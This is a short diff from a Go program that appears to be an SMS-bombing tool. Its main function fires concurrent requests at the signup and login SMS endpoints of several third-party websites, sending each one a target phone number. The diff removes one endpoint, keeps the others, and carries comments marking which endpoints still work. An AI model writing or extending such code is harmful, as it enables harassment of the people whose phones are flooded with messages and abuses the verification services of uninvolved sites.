@@ -471,9 +471,6 @@ func main() {
 		go sms("https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://www.irantic.com/api/login/authenticate", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // active ✅
 		go sms("https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
 			"phone": phone,
 		}, ch)
